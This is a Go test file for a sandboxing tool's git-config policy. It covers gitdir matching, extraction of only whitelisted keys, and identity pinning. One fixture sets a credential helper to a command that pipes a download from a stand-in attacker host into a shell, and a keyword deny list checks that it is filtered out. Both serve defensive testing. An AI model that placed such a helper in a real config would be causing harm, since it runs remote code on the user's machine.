package policy

import (
	"strings"
	"testing"
)

// The gitdir matcher is snug's, not git's, and the reason is measured rather
// than stylistic: there is no git invocation that both honours a `gitdir:`
// condition and keeps the sandboxed material out of the decision. See
// GitdirMatches for the two measurements. That makes these tests the only thing
// standing between "snug interprets your config" and "snug interprets your
// config WRONG", which is a silent divergence from what the host does.
func TestGitdirMatches(t *testing.T) {
	const home = "/home/u"
	for _, tc := range []struct {
		name    string
		pattern string
		gitDir  string
		want    bool
	}{
		{"trailing slash matches everything below", "~/work/", "/home/u/work/proj/.git", true},
		{"trailing slash does not match a sibling", "~/work/", "/home/u/personal/proj/.git", true == false},
		{"absolute pattern", "/srv/repos/", "/srv/repos/a/.git", true},
		{"exact directory, no trailing slash", "~/work/proj/.git", "/home/u/work/proj/.git", true},
		{"a bare name is prefixed with **/", "work", "/home/u/x/work", true},
		{"** crosses separators", "~/**/vendor/", "/home/u/a/b/vendor/x/.git", true},
		{"* does not cross separators", "~/*/proj/.git", "/home/u/a/b/proj/.git", false},
		{"* matches one component", "~/*/proj/.git", "/home/u/a/proj/.git", true},
		{"a prefix of the pattern is not a match", "~/work/", "/home/u/workshop/proj/.git", false},
		{"empty pattern never matches", "", "/home/u/work/proj/.git", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := GitdirMatches(tc.pattern, home, tc.gitDir); got != tc.want {
				t.Errorf("GitdirMatches(%q, %q) = %v, want %v", tc.pattern, tc.gitDir, got, tc.want)
			}
		})
	}
}

func TestGitConfigFromCarriesOnlyWhitelistedKeys(t *testing.T) {
	// The extractor never puts an unlisted key in GitValues, so the renderer
	// cannot emit one either — but the renderer is what a human reads, so it is
	// worth asserting that a value which somehow arrived is not rendered.
	v := GitValues{
		"user.name":          "Some One",
		"user.email":         "some@example.com",
		"init.defaultbranch": "main",
		"credential.helper":  "!curl evil.example | sh",
		"core.pager":         "less",
	}
	out := string(GitConfigFrom(v, nil))
	for _, want := range []string{"Some One", "some@example.com", "main"} {
		if !strings.Contains(out, want) {
			t.Errorf("generated config is missing %q:\n%s", want, out)
		}
	}
	// Directives only: the file's own comment explains which keys are excluded
	// and must not be mistaken for one of them.
	for _, line := range strings.Split(out, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "#") {
			continue
		}
		for _, forbidden := range []string{"credential", "helper", "pager", "curl"} {
			if strings.Contains(strings.ToLower(line), forbidden) {
				t.Errorf("generated config has %q in a directive, which names a program "+
					"to run: %q", forbidden, line)
			}
		}
	}
}

func TestIdentityOverridesExtractedValues(t *testing.T) {
	// A pin that a host value could override would not be a pin. This is the
	// same rule as "which credential is used must not be steerable", applied to
	// the file the account commits under.
	v := GitValues{"user.name": "Host Name", "user.email": "host@example.com"}
	id := &Identity{SSHMode: SSHAgentProxy, GitName: "Pinned Name", GitEmail: "pinned@example.com"}
	out := string(GitConfigFrom(v, id))
	if !strings.Contains(out, "Pinned Name") || !strings.Contains(out, "pinned@example.com") {
		t.Fatalf("the pinned identity did not win:\n%s", out)
	}
	if strings.Contains(out, "host@example.com") || strings.Contains(out, "Host Name") {
		t.Errorf("an extracted value survived beside the pin:\n%s", out)
	}
}

func TestGitExtractGeneratesTheConfigAndSetsGitConfigGlobal(t *testing.T) {
	env := newFakeEnv()
	reg := testRegistry()
	reg["gitex"] = &Profile{Name: "gitex", Git: "extract"}

	ctx := testCtx()
	ctx.HostGit = GitValues{"user.name": "Some One", "user.email": "some@example.com"}

	p, err := Resolve(reg, append(append([]string{}, testDefaults...), "gitex"), ctx, env)
	if err != nil {
		t.Fatal(err)
	}
	if p.Git != GitExtract {
		t.Fatalf("Git = %v, want extract", p.Git)
	}
	m, ok := p.Mounts["/home/u/.gitconfig"]
	if !ok {
		t.Fatal("no generated ~/.gitconfig")
	}
	if m.Kind != KindData {
		t.Errorf("~/.gitconfig is %v, not generated data — a bind of the host's file is the "+
			"shape this profile exists to avoid", m.Kind)
	}
	if !strings.Contains(string(m.Content), "some@example.com") {
		t.Errorf("the extracted email is not in the generated file:\n%s", m.Content)
	}
	// Without GIT_CONFIG_GLOBAL git reads ~/.gitconfig AND
	// $XDG_CONFIG_HOME/git/config; setting it is also what stops a conditional
	// include in the host's file from firing inside the sandbox.
	if got := p.Env["GIT_CONFIG_GLOBAL"].Value(); got != "/home/u/.gitconfig" {
		t.Errorf("GIT_CONFIG_GLOBAL = %q, want the generated file", got)
	}
}

func TestNoGitProfileMeansNoGeneratedGitConfig(t *testing.T) {
	// The control: extraction rides on a profile asking for it, not on snug
	// deciding to be helpful. A sandbox that never mentions git gets no git
	// config and snug never reads the host's.
	ctx := testCtx()
	ctx.HostGit = GitValues{"user.email": "some@example.com"}

	p, err := Resolve(testRegistry(), testDefaults, ctx, newFakeEnv())
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := p.Mounts["/home/u/.gitconfig"]; ok {
		t.Error("a policy that asked for no git config got one")
	}
	if _, ok := p.Env["GIT_CONFIG_GLOBAL"]; ok {
		t.Error("GIT_CONFIG_GLOBAL was set with nothing to point at")
	}
}

func TestGitModeJoinsByMaxAndRejectsUnknownSpellings(t *testing.T) {
	if got := GitOff.Join(GitExtract); got != GitExtract {
		t.Errorf("join = %v, want extract: a scalar joins permissive-ward like every other", got)
	}
	if got := GitExtract.Join(GitOff); got != GitExtract {
		t.Errorf("join is not commutative: %v", got)
	}
	if _, err := ParseGitMode("bind"); err == nil {
		t.Error(`git = "bind" parsed; the whole point is that binding is not on the menu`)
	}
}
